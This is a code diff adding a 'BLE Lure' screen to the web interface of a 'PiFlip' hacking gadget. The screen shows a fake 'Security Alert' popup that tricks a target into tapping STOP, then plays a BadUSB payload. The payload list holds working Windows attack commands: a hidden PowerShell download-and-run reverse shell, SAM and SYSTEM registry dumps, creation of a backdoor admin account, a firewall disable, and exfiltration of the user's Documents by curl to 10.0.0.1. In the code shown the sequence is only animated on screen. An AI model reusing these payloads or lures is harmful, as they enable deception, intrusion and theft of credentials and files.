@@ -469,6 +469,7 @@ const MAIN={title:'PiFlip',items:[
     {icon:'🎧',label:'Audio Devices',   desc:'Pair headphones',...inf('🎧','Bluetooth Audio','Requires pulseaudio-module-bluetooth.\nNote: WiFi & BT share one antenna.','A2DP')},
     {icon:'📡',label:'BLE Spam',        desc:'Flood nearby devices',type:'blespam'},
     {icon:'🪟',label:'Custom Popup',    desc:'Craft a BLE notification',type:'custompopup'},
+    {icon:'🪤',label:'BLE Lure',        desc:'STOP button → BLE → BadUSB',type:'blelure'},
   ]}},
   {icon:'🔗',color:'#1FCC7C',label:'BlueNet',desc:'Mesh LAN between PiFlips',menu:{title:'BlueNet',items:[
     {icon:'🔍',label:'Discover Peers',desc:'Find nearby PiFlips',...inf('🔍','Scanning…','Broadcasting on UDP 42424\nNo other PiFlips found.','0 peers')},
@@ -664,7 +665,7 @@ function render(){
     snake:buildSnake,tetris:buildTetris,
     'pong-ai':(v,c)=>buildPong(v,true,c),'pong-2p':(v,c)=>buildPong(v,false,c),
     'chess-ai':(v,c)=>buildChess(v,true,c),'chess-2p':(v,c)=>buildChess(v,false,c),
-    flappy:buildFlappy,info:buildInfo,hotspot:buildHotspot,blespam:buildBleSpam,custompopup:buildCustomPopup,
+    flappy:buildFlappy,info:buildInfo,hotspot:buildHotspot,blespam:buildBleSpam,custompopup:buildCustomPopup,blelure:buildBleLure,
     breakout:buildBreakout,
     g2048:build2048,
     ttt:buildTTT,
@@ -833,6 +834,146 @@ function buildHotspot(v){
   const card=document.createElement('div');card.className='hs-card';
   card.innerHTML=`<div class="hs-row"><span class="hs-k">Status</span><span class="hs-v ${hotspotOn?'on':''}">${hotspotOn?'● ACTIVE':'○ OFF'}</span></div><div class="hs-row"><span class="hs-k">SSID</span><span class="hs-v">PiFlip-Mesh</span></div><div class="hs-row"><span class="hs-k">Password</span><span class="hs-v">piflip123</span></div><div class="hs-row"><span class="hs-k">AP IP</span><span class="hs-v">${hotspotOn?'10.42.0.1':'—'}</span></div><div class="hs-row"><span class="hs-k">Channel</span><span class="hs-v">6</span></div><div class="hs-row"><span class="hs-k">Interface</span><span class="hs-v">wlan0</span></div><div class="hs-row"><span class="hs-k">DHCP</span><span class="hs-v">10.42.0.10–100</span></div>`;
   v.appendChild(card);
+}
+
+/* ═══════════════════════════════════════════════════════════
+   BLE LURE
+═══════════════════════════════════════════════════════════ */
+function buildBleLure(v){
+  v.appendChild(mkTbar('BLE Lure',true));
+
+  const PAYLOADS=[
+    {label:'Open Calculator',lines:['GUI r','DELAY 400','STRING calc.exe','ENTER']},
+    {label:'Reverse Shell',lines:['GUI r','DELAY 400','STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.0.0.1/sh.ps1\')"','ENTER']},
+    {label:'Dump Passwords',lines:['GUI r','DELAY 400','STRING cmd /c reg save HKLM\\SAM C:\\sam.bak & reg save HKLM\\SYSTEM C:\\sys.bak','ENTER']},
+    {label:'Add Admin User',lines:['GUI r','DELAY 400','STRING cmd /c net user hax0r P@ss123 /add & net localgroup administrators hax0r /add','ENTER']},
+    {label:'Disable Firewall',lines:['GUI r','DELAY 400','STRING cmd /c netsh advfirewall set allprofiles state off','ENTER']},
+    {label:'Exfil Documents',lines:['GUI r','DELAY 400','STRING powershell -w h Compress-Archive $env:USERPROFILE\\Documents C:\\out.zip; curl -F f=@C:\\out.zip http://10.0.0.1/up','ENTER']},
+  ];
+
+  const wrap=document.createElement('div');wrap.style.cssText='flex:1;display:flex;flex-direction:column;gap:0;overflow-y:auto;scrollbar-width:none;';
+
+  // — Lure message editor —
+  const secMsg=document.createElement('div');secMsg.className='cp-section';
+  const lMsg=document.createElement('div');lMsg.className='cp-section-title';lMsg.textContent='LURE MESSAGE';
+  const msgInp=document.createElement('input');msgInp.type='text';msgInp.maxLength=60;msgInp.value='⚠️ Security Alert — tap STOP to protect your device';
+  msgInp.style.cssText='width:100%;box-sizing:border-box;background:var(--elev);border:1px solid var(--brd);border-radius:6px;padding:7px 10px;font-family:\'Courier New\',monospace;font-size:11px;color:var(--txt);outline:none;';
+  msgInp.addEventListener('focus',()=>{msgInp.style.borderColor='var(--acc)';});
+  msgInp.addEventListener('blur', ()=>{msgInp.style.borderColor='var(--brd)';});
+  secMsg.appendChild(lMsg);secMsg.appendChild(msgInp);wrap.appendChild(secMsg);
+
+  // — Button label —
+  const secBtn=document.createElement('div');secBtn.className='cp-section';
+  const lBtn=document.createElement('div');lBtn.className='cp-section-title';lBtn.textContent='BUTTON LABEL';
+  const btnInp=document.createElement('input');btnInp.type='text';btnInp.maxLength=16;btnInp.value='STOP';
+  btnInp.style.cssText=msgInp.style.cssText;
+  btnInp.addEventListener('focus',()=>{btnInp.style.borderColor='var(--acc)';});
+  btnInp.addEventListener('blur', ()=>{btnInp.style.borderColor='var(--brd)';});
+  secBtn.appendChild(lBtn);secBtn.appendChild(btnInp);wrap.appendChild(secBtn);
+
+  // — BadUSB payload picker —
+  const secPay=document.createElement('div');secPay.className='cp-section';
+  const lPay=document.createElement('div');lPay.className='cp-section-title';lPay.textContent='BADUSB PAYLOAD';
+  let selPay=0;
+  const payList=document.createElement('div');payList.style.cssText='display:flex;flex-direction:column;gap:3px;';
+  PAYLOADS.forEach((p,i)=>{
+    const row=document.createElement('div');
+    row.style.cssText=`display:flex;align-items:center;gap:8px;padding:6px 9px;border-radius:6px;border:1px solid ${i===0?'var(--dan)':'var(--brd)'};background:${i===0?'rgba(255,71,87,.08)':'var(--elev)'};cursor:pointer;font-family:'Courier New',monospace;font-size:10px;color:${i===0?'#FF4757':'var(--mut)'};transition:.1s;`;
+    row.textContent='⚡ '+p.label;
+    row.onclick=()=>{
+      selPay=i;
+      payList.querySelectorAll('div').forEach((r2,j)=>{
+        r2.style.borderColor=j===i?'var(--dan)':'var(--brd)';
+        r2.style.background=j===i?'rgba(255,71,87,.08)':'var(--elev)';
+        r2.style.color=j===i?'#FF4757':'var(--mut)';
+      });
+    };
+    payList.appendChild(row);
+  });
+  secPay.appendChild(lPay);secPay.appendChild(payList);wrap.appendChild(secPay);
+
+  // — Launch button —
+  const launchBtn=document.createElement('div');launchBtn.className='cp-send-btn';
+  launchBtn.style.cssText+='border-color:rgba(255,71,87,.4);background:rgba(255,71,87,.08);color:#FF4757;';
+  launchBtn.textContent='🪤  DEPLOY LURE';
+  wrap.appendChild(launchBtn);
+  v.appendChild(wrap);
+
+  // — Overlay (fixed, full viewport) —
+  launchBtn.onclick=()=>{
+    launchBtn.style.opacity='.4';launchBtn.style.pointerEvents='none';
+
+    const overlay=document.createElement('div');
+    overlay.style.cssText='position:fixed;inset:0;z-index:9999;pointer-events:auto;';
+    document.body.appendChild(overlay);
+
+    // The lure notification card
+    const card=document.createElement('div');
+    card.style.cssText='position:absolute;left:12px;right:12px;top:0;transform:translateY(-120%);transition:transform .45s cubic-bezier(.22,.68,0,1.2);background:#1c1c2e;border:1px solid #2d2d50;border-radius:14px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.7),0 0 0 .5px rgba(255,255,255,.06);';
+    // header bar
+    const bar=document.createElement('div');bar.style.cssText='display:flex;align-items:center;gap:6px;padding:8px 10px 4px;';
+    bar.innerHTML='<div style="width:18px;height:18px;border-radius:5px;background:#ff4757;display:flex;align-items:center;justify-content:center;font-size:11px;">⚠️</div><span style="font-family:system-ui;font-size:10px;font-weight:600;color:#fff;flex:1;">Security Alert</span><span style="font-family:system-ui;font-size:10px;color:rgba(255,255,255,.4);">now</span>';
+    // message
+    const msgEl=document.createElement('div');msgEl.style.cssText='padding:2px 10px 8px;font-family:system-ui;font-size:12px;color:rgba(255,255,255,.85);line-height:1.35;';
+    msgEl.textContent=msgInp.value||'⚠️ Security Alert — tap STOP to protect your device';
+    // stop button
+    const stopEl=document.createElement('div');
+    stopEl.style.cssText='margin:0 10px 10px;padding:9px;text-align:center;border-radius:8px;background:#FF4757;color:#fff;font-family:system-ui;font-size:13px;font-weight:700;cursor:pointer;letter-spacing:.5px;';
+    stopEl.textContent=btnInp.value||'STOP';
+    card.appendChild(bar);card.appendChild(msgEl);card.appendChild(stopEl);
+    overlay.appendChild(card);
+
+    // slide in
+    requestAnimationFrame(()=>requestAnimationFrame(()=>{card.style.transform='translateY(12px)';}));
+
+    stopEl.onclick=()=>{
+      // dismiss card, run BLE→BadUSB sequence
+      card.style.transform='translateY(-120%)';
+      setTimeout(()=>{card.remove();runSequence();},450);
+    };
+
+    function runSequence(){
+      const seq=document.createElement('div');
+      seq.style.cssText='position:fixed;inset:0;z-index:10000;background:rgba(0,0,0,.92);display:flex;flex-direction:column;padding:20px 16px 16px;font-family:\'Courier New\',monospace;pointer-events:auto;';
+      document.body.appendChild(seq);
+
+      const title=document.createElement('div');title.style.cssText='font-size:11px;color:#FF4757;letter-spacing:1px;margin-bottom:12px;';title.textContent='[ BLE LURE — PAYLOAD DEPLOYING ]';
+      const term=document.createElement('div');term.style.cssText='flex:1;overflow-y:auto;scrollbar-width:none;';
+      const closeRow=document.createElement('div');closeRow.style.cssText='display:flex;justify-content:flex-end;margin-top:10px;';
+      const closeBtn=document.createElement('div');closeBtn.className='cp-overlay-stop';closeBtn.textContent='■  CLOSE';
+      closeBtn.onclick=()=>{seq.remove();overlay.remove();launchBtn.style.opacity='1';launchBtn.style.pointerEvents='auto';};
+      closeRow.appendChild(closeBtn);
+      seq.appendChild(title);seq.appendChild(term);seq.appendChild(closeRow);
+
+      const STEPS=[
+        {delay:0,   color:'#1FCC7C', text:'[BLE] Broadcasting lure notification…'},
+        {delay:800, color:'#1FCC7C', text:'[BLE] Target interaction detected'},
+        {delay:1400,color:'#2DA8FF', text:'[BLE] Initiating pairing handshake…'},
+        {delay:2200,color:'#2DA8FF', text:'[BLE] Pairing complete  ✓'},
+        {delay:2800,color:'#FFD700', text:'[USB] Enumerating as HID keyboard…'},
+        {delay:3400,color:'#FFD700', text:'[USB] HID ready  ✓'},
+        {delay:3900,color:'#FF4757', text:'[PAY] Running: '+PAYLOADS[selPay].label},
+        ...PAYLOADS[selPay].lines.map((line,i)=>({delay:4400+i*420,color:'#aaa',text:'  > '+line})),
+        {delay:4400+PAYLOADS[selPay].lines.length*420, color:'#1FCC7C', text:'[PAY] Payload complete  ✓'},
+      ];
+
+      let i=0;
+      function next(){
+        if(i>=STEPS.length)return;
+        const s=STEPS[i++];
+        setTimeout(()=>{
+          const ln=document.createElement('div');ln.style.cssText=`color:${s.color};font-size:10px;line-height:1.6;white-space:pre-wrap;word-break:break-all;`;ln.textContent=s.text;
+          term.appendChild(ln);term.scrollTop=term.scrollHeight;
+          next();
+        },i===1?s.delay:s.delay-STEPS[i-2].delay);
+      }
+      next();
+    }
+  };
+
+  const kh=e=>{if(e.key==='Escape')goBack();};
+  document.addEventListener('keydown',kh);
+  v.remove=((orig)=>()=>{document.removeEventListener('keydown',kh);document.querySelectorAll('[style*="z-index:9999"],[style*="z-index:10000"]').forEach(el=>el.remove());orig();})(v.remove.bind(v));
 }
 
 /* ═══════════════════════════════════════════════════════════
@@ -9656,7 +9797,7 @@ function pushItem(it){
   }
   if(it.gameKey&&!it.hasDiff){stack.push({type:it.gameKey,diff:1});render();return;}
   const gameTypes=['snake','tetris','pong-ai','pong-2p','chess-ai','chess-2p','flappy','hotspot','info','breakout','g2048','ttt','simon','mines','hangman','invaders','c4','mole','memory','asteroids','frogger','galaga','centipede','lunar','sokoban','lightsout','reversi','battleship','numguess','reaction','blackjack','slide','tron','wordle','mathflash','platform','life','rps','colormatch','darts','checkers','typing','mastermind','hanoi','nim','bubble','slot','bowling','mancala','sudoku','pacman','cardodge','fruitcatch','match3','missile','pinball','gravflip','poker','pipe','maze','numchain','runner','spaceshoot','yahtzee','war','hexgrid','craps','pixelart','gravball','wordsearch','colorflood','fusion','brickx','jumpjack','dodge','trivia','snakex','pong3','gridrush','blockstack','flappyx','virus','beattap','anagram','chainreact','astminer','tankbattle','spelling','magicsq','orbit','laser','sprintdigits','floodesc','zombierun','iceslide','crystalcave','numtap','gravpong','emojimem','taprace','codebreak','gemswap','spinwheel','numpyramid','neonsnake','tileshift','starfield','wordladder','dropzone','brickbreakplus','reactionmatch','snakemaze'];
-  const uiTypes=['hotspot','blespam','custompopup'];
+  const uiTypes=['hotspot','blespam','custompopup','blelure'];
   if(it.type&&(gameTypes.includes(it.type)||uiTypes.includes(it.type)))stack.push({...it});
   else if(it.menu)stack.push({...it.menu,_sel:0});
   else stack.push({type:'info',ico:it.icon||'⚙️',title:it.label,body:'Requires physical hardware on the Pi.',badge:'Hardware only'});
